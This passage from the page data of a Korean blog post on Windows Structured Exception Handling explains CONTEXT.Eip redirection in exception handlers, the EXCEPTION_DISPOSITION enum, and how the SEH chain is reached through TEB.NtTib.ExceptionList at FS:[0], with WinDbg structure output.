포인터를 넘겨준다.</p>\n</li>\n<li>\n<p>구조체 멤버 중 EIP 멤버가 있다.(offset: B8)</p>\n</li>\n<li>\n<p>예외 처리기에서 파라미터로 넘어온 CONTEXT.Eip 를 다른 주소로 설정한 후 예외 처리기 함수를 리턴시키면, 아까 중지된 스레드는 새로 설정된 EIP 주소의 코드를 실행한다.</p>\n</li>\n</ul>\n<h3 id=\"exception_disposition-enum\" style=\"position:relative;\"><a href=\"#exception_disposition-enum\" aria-label=\"exception_disposition enum permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>EXCEPTION_DISPOSITION enum</h3>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">enum</span> <span class=\"token class-name\">_EXCEPTION_DISPOSITION</span>\n<span class=\"token punctuation\">{</span>\n         ExceptionContinueExecution <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n         ExceptionContinueSearch <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n         ExceptionNestedException <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n         ExceptionCollidedUnwind <span class=\"token operator\">=</span> <span class=\"token number\">3</span>\n<span class=\"token punctuation\">}</span> EXCEPTION_DISPOSITION<span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>예외 처리기 (SEH)에서 예외를 처리했다면 <code class=\"language-text\">ExceptionContinueExecution(0)</code> 을 리턴할 경우 예외가 발생한 코드부터 재실행된다.</li>\n<li>만약 예외를 처리할 수 없다면 ExceptionContinueSearch(1)을 리턴하여 SEH chain에서 다음 예외 처리기에서 처리하도록 한다.</li>\n</ul>\n<h3 id=\"tebnttibexceptionlist\" style=\"position:relative;\"><a href=\"#tebnttibexceptionlist\" aria-label=\"tebnttibexceptionlist permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TEB.NtTib.ExceptionList</h3>\n<ul>\n<li>프로세스의 SEH chain.에 접근하는 방법은 간단하다.</li>\n<li>TEB(THREAD ENVIRONMENT BLOCK) 구조체의 NtTib 멤버를 따라가면 된다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0</span><span class=\"token operator\">:</span><span class=\"token number\">003</span><span class=\"token operator\">></span> dt _NT_TIB\nntdll<span class=\"token operator\">!</span>_NT_TIB\n   <span class=\"token operator\">+</span><span class=\"token number\">0x000</span> ExceptionList    <span class=\"token operator\">:</span> Ptr32 _EXCEPTION_REGISTRATION_RECORD\n   <span class=\"token operator\">+</span><span class=\"token number\">0x004</span> StackBase        <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x008</span> StackLimit       <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x00c</span> SubSystemTib     <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x010</span> FiberData        <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x010</span> Version          <span class=\"token operator\">:</span> Uint4B\n   <span class=\"token operator\">+</span><span class=\"token number\">0x014</span> ArbitraryUserPointer <span class=\"token operator\">:</span> Ptr32 Void\n   <span class=\"token operator\">+</span><span class=\"token number\">0x018</span> Self             <span class=\"token operator\">:</span> Ptr32 _NT_TIB</code></pre></div>\n<ul>\n<li>TEB 구조체에서 가장 첫 멤버임을 확인할 수 있다.</li>\n<li>TEB는 FS 세그먼트 레지스터가 가리키는 세그먼트 메모리의 시작 주소 (base address)에 위치한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">TEB<span class=\"token punctuation\">.</span>NtTib<span class=\"token punctuation\">.</span>ExceptionList <span class=\"token operator\">=</span> FS<span class=\"token operator\">:</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<ul>\n<li><a href=\"#seh-%EB%A7%A4%EC%BB%A4%EB%8B%88%EC%A6%98\">SEH 매커니즘</a></li>\n<li><a href=\"#%EC%9D%BC%EB%B0%98-%EC%8B%A4%ED%96%89%EC%9D%98-%EA%B2%BD%EC%9A%B0-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EB%B2%95\">일반 실행의 경우 예외 처리 방법</a></li>\n<li><a href=\"#%EB%94%94%EB%B2%84%EA%B9%85-%EC%8B%A4%ED%96%89%EC%9D%98-%EA%B2%BD%EC%9A%B0-%EC%98%88%EC%99%B8-%EC%B2%98%EB%A6%AC-%EB%B0%A9%EB%B2%95\">디버깅 실행의 경우 예외 처리 방법</a></li>\n<li><a href=\"#%EB%94%94%EB%B2%84%EA%B1%B0-%EC%8B%A4%ED%96%89-%EC%A4%91%EC%A7%80%EC%8B%9C-%EC%A1%B0%EC%B9%98\">디버거 실행 중지시 조치</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#excpetion\">Excpetion</a></p>\n<ul>\n<li><a href=\"#status_access_violation--dword---0xc0000005l\">STATUS_ACCESS_VIOLATION  (DWORD   )0xC0000005L</a></li>\n<li><a href=\"#status_breakpoint-dword---0x80000003l\">STATUS_BREAKPOINT (DWORD   )0x80000003L</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#breakpoint-%EA%B5%AC%ED%98%84-%EB%B0%A9%EB%B2%95\">BreakPoint 구현 방법</a></p>\n<ul>\n<li><a href=\"#int-3\">INT 3</a></li>\n<li><a href=\"#status_illegal_instruction-------dword---0xc000001dl\">STATUS_ILLEGAL_INSTRUCTION       ((DWORD   )0xC000001DL)</a></li>\n<li><a href=\"#status_integer_divide_by_zero----dword---0xc0000094l\">STATUS_INTEGER_DIVIDE_BY_ZERO    (DWORD   )0xC0000094L</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#seh-chain\">SEH Chain</a></p>\n</li>\n<li>\n<p><a href=\"#seh-%ED%95%A8%EC%88%98-%EC%A0%95%EC%9D%98\">SEH 함수 정의</a></p>\n<ul>\n<li><a href=\"#multi-thread\">Multi-Thread</a></li>\n<li><a href=\"#exception_disposition-enum\">EXCEPTION_DISPOSITION enum</a></li>\n<li><a href=\"#tebnttibexceptionlist\">TEB.NtTib.ExceptionList</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"January 03, 2021","title":"Windows SEH (Structured Exception Handler) 0","categories":"Windows","author":"Zer0Luck","emoji":"🍙"},"fields":{"slug":"/window_3_theori/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/window_1_theori/","nextSlug":"/php-sqlite3-1day-rce/","prevSlug":"/window_3_theori/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}